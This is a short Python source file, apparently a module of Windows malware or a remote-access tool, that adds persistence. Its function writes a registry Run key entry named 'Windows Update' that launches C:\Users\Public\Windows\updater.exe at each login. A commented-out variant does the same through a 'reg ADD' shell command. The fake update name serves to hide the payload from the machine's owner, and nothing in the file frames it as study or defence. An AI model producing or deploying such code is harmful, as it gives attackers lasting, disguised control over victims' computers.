import os, _winreg

class Persistence(object):
    cmdRegPersistence = 'reg ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Update" /t REG_SZ /d "C:\Users\Public\Windows\updater.exe" /f'


    def doPersistence(self):
        """try:
            proc = subprocess.Popen(self.cmdRegPersistence, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout = proc.stdout.read() + proc.stderr.read()
            return 'Persitence added. ' + stdout
        except:
            return 'There is some problems.'"""
        REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                           _winreg.KEY_WRITE)
            _winreg.SetValueEx(registry_key, 'Windows Update', 0, _winreg.REG_SZ, 'C:\\Users\\Public\\Windows\\updater.exe')
            _winreg.CloseKey(registry_key)
            return 'Persistece added succesfully.\n'
        except WindowsError:
            return 'There are some problems with adding persistence!!!\n'